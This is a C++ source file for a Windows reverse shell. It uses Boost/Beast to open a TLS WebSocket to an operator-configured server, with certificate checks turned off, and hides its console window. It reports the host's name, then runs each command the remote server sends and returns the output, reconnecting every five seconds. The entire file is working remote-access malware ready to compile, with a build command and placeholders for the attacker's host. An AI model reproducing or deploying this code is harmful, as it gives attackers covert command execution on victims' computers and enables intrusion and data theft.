// WEBSOCKET TLS SHELL - C++ VERSION
// Requires Boost/Beast libraries
// Compile: g++ websocket_shell.cpp -o websocket_shell.exe -lboost_system -lssl -lcrypto -lpthread -static

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/beast/websocket/ssl.hpp>
#include <boost/asio/connect.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/ssl/stream.hpp>
#include <windows.h>
#include <string>
#include <iostream>
#include <thread>
#include <cstdlib>

namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
namespace ssl = net::ssl;
using tcp = net::ip::tcp;

#define SERVER "your-server.com"  // CHANGE THIS
#define PORT "8765"                // CHANGE THIS
#define PATH "/shell"              // CHANGE THIS

class WebSocketShell {
private:
    net::io_context ioc;
    ssl::context ctx{ssl::context::tlsv12_client};
    std::unique_ptr<websocket::stream<ssl::stream<tcp::socket>>> ws;
    
    std::string ExecuteCommand(const char* cmd) {
        char buffer[4096];
        std::string result;
        
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        CreatePipe(&hRead, &hWrite, &sa, 0);
        
        STARTUPINFO si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        PROCESS_INFORMATION pi;
        
        if (CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        }
        
        CloseHandle(hRead);
        CloseHandle(hWrite);
        
        return result.empty() ? "[OK]" : result;
    }
    
    bool Connect() {
        try {
            // Set up SSL context (skip verification for self-signed)
            ctx.set_verify_mode(ssl::verify_none);
            
            tcp::resolver resolver{ioc};
            auto const results = resolver.resolve(SERVER, PORT);
            
            ws = std::make_unique<websocket::stream<ssl::stream<tcp::socket>>>(ioc, ctx);
            
            net::connect(ws->next_layer().next_layer(), results.begin(), results.end());
            
            ws->next_layer().handshake(ssl::stream_base::client);
            
            ws->handshake(SERVER, PATH);
            
            return true;
        } catch (std::exception const& e) {
            return false;
        }
    }
    
public:
    WebSocketShell() {
        FreeConsole();
    }
    
    void Run() {
        while (true) {
            if (!Connect()) {
                Sleep(5000);
                continue;
            }
            
            // Send system info
            char hostname[256];
            gethostname(hostname, sizeof(hostname));
            ws->write(net::buffer(std::string("[CONNECT] ") + hostname));
            
            beast::flat_buffer buffer;
            
            while (true) {
                try {
                    ws->read(buffer);
                    std::string cmd = beast::buffers_to_string(buffer.data());
                    buffer.consume(buffer.size());
                    
                    if (cmd == "exit") break;
                    
                    std::string output = ExecuteCommand(cmd.c_str());
                    ws->write(net::buffer(output));
                    
                } catch (beast::system_error const& e) {
                    break;
                }
            }
            
            ws->close(websocket::close_code::normal);
            Sleep(5000);
        }
    }
};

int main() {
    WebSocketShell shell;
    shell.Run();
    return 0;
}